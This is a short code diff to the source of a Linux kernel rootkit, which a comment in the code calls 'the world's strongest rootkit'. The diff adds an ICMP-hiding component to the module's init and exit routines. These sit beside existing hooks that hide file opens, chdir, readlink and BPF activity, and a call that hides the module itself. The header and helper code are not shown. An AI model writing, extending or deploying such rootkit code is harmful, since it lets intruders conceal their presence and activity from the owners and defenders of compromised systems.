@@ -12,6 +12,7 @@
 #include "include/hide_module.h"
 #include "include/open.h"
 #include "include/bpf_hook.h"
+#include "include/icmp.h"
 
 /*
 You loaded the world's strongest rootkit into my heart... woman, you are so beautiful and gentle, you changed my life, I love you <3
@@ -33,6 +34,7 @@ static int __init singularity_init(void) {
     ret |= hiding_chdir_init();
     ret |= hiding_readlink_init();
     ret |= bpf_hook_init();
+    ret |= hiding_icmp_init();
     module_hide_current(); // optional
     return ret;
 }
@@ -50,6 +52,7 @@ static void __exit singularity_exit(void) {
     hiding_readlink_exit();
     hiding_open_exit();
     bpf_hook_exit();
+    hiding_icmp_exit();
 }
 
 module_init(singularity_init);
